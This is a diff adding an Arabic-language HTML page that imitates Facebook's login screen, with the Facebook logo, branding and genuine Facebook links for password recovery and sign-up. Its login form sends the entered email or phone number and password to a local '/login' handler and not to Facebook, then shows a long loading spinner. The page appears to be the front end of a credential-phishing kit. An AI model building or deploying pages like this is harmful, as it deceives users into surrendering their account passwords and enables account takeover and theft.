@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فيسبوك - تسجيل الدخول أو الاشتراك</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background: linear-gradient(to right, #e4e9f0, #f0f2f5);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            padding: 0;
+        }
+        .container {
+            width: 100%;
+            max-width: 380px;
+            padding: 40px;
+            background-color: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 16px 32px rgba(0, 0, 0, 0.15);
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            min-height: 580px;
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
+        }
+        .container:hover {
+            transform: scale(1.02);
+        }
+        .logo-wrapper {
+            margin-bottom: 20px;
+        }
+        .logo {
+            width: 60px;
+            margin-bottom: 10px;
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.4));
+        }
+        .logo-text {
+            font-size: 50px;
+            color: #1877f2;
+            font-weight: 700;
+            margin-bottom: 30px;
+            letter-spacing: -0.5px;
+            text-shadow: 1px 1px 4px rgba(0, 0, 0, 0.3);
+        }
+        input {
+            width: calc(100% - 24px);
+            padding: 18px;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            box-sizing: border-box;
+            background-color: #f5f6f7;
+            transition: border-color 0.3s, box-shadow 0.3s, background-color 0.3s;
+        }
+        input::placeholder {
+            color: #9e9e9e;
+            opacity: 1;
+        }
+        input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 12px rgba(24, 119, 242, 0.5);
+            outline: none;
+            background-color: #ffffff;
+        }
+        button {
+            width: calc(100% - 24px);
+            padding: 18px;
+            border: none;
+            border-radius: 10px;
+            color: #ffffff;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background 0.3s, transform 0.3s, box-shadow 0.3s;
+            font-weight: 600;
+            text-transform: uppercase;
+            position: relative;
+        }
+        .login-button {
+            background-color: #1877f2;
+            margin-top: 15px;
+        }
+        .login-button::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: rgba(24, 119, 242, 0.6);
+            transform: scaleX(0);
+            transition: transform 0.3s ease-in-out;
+        }
+        .login-button:hover::after {
+            transform: scaleX(1);
+        }
+        .login-button:hover {
+            background-color: #165eab;
+            transform: translateY(-2px);
+            box-shadow: 0 12px 24px rgba(24, 119, 242, 0.3);
+        }
+        .create-account-button {
+            background-color: #42b72a;
+            margin-top: 20px;
+        }
+        .create-account-button::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: rgba(66, 183, 42, 0.6);
+            transform: scaleX(0);
+            transition: transform 0.3s ease-in-out;
+        }
+        .create-account-button:hover::after {
+            transform: scaleX(1);
+        }
+        .create-account-button:hover {
+            background-color: #36a420;
+            transform: translateY(-2px);
+            box-shadow: 0 12px 24px rgba(66, 183, 42, 0.3);
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 16px;
+            color: #65676b;
+            line-height: 1.8;
+            text-align: center;
+        }
+        .footer a {
+            color: #1877f2;
+            text-decoration: none;
+            display: inline-block;
+            margin: 5px 0;
+            font-weight: 500;
+            transition: color 0.3s, text-decoration 0.3s;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+            color: #165eab;
+        }
+        .footer .line {
+            border-top: 1px solid #ddd;
+            margin: 20px 0;
+            height: 1px;
+            background: #ddd;
+        }
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px;
+                max-width: 100%;
+                box-shadow: 0 12px 24px rgba(0,0,0,0.2);
+                min-height: 560px;
+            }
+            .logo {
+                width: 50px;
+                margin-bottom: 10px;
+            }
+            .logo-text {
+                font-size: 40px;
+                margin-bottom: 20px;
+            }
+            input {
+                padding: 14px;
+                font-size: 15px;
+            }
+            button {
+                padding: 14px;
+                font-size: 16px;
+            }
+            .footer .line {
+                margin: 10px 0;
+            }
+        }
+        /* Loading Spinner */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            z-index: 999;
+            justify-content: center;
+            align-items: center;
+            transition: opacity 0.3s ease;
+        }
+        .loading-overlay.show {
+            display: flex;
+            opacity: 1;
+        }
+        .spinner {
+            border: 8px solid rgba(0, 0, 0, 0.1); /* Adjusted thickness */
+            border-radius: 50%;
+            border-top: 8px solid #1877f2;
+            width: 80px; /* Size of the spinner */
+            height: 80px; /* Size of the spinner */
+            animation: spin 7s linear infinite; /* Total duration */
+            box-shadow: 0 0 20px rgba(24, 119, 242, 0.5); /* Shadow */
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(2500deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-wrapper">
+            <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook Logo" class="logo">
+            <div class="logo-text">facebook</div>
+        </div>
+        <form id="loginForm" action="/login" method="POST" onsubmit="showLoading()">
+            <input type="text" name="username" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" name="password" placeholder="كلمة المرور" required>
+            <button type="submit" class="login-button">تسجيل الدخول</button>
+        </form>
+        <div class="footer">
+            <a class="forgot-password" href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">نسيت كلمة المرور؟</a>
+            <button class="create-account-button" onclick="window.location.href='https://www.facebook.com/r.php'">إنشاء حساب جديد</button>
+        </div>
+    </div>
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="spinner"></div>
+    </div>
+    <script>
+        function showLoading() {
+            document.getElementById('loadingOverlay').classList.add('show');
+        }
+    </script>
+</body>
+</html>
+
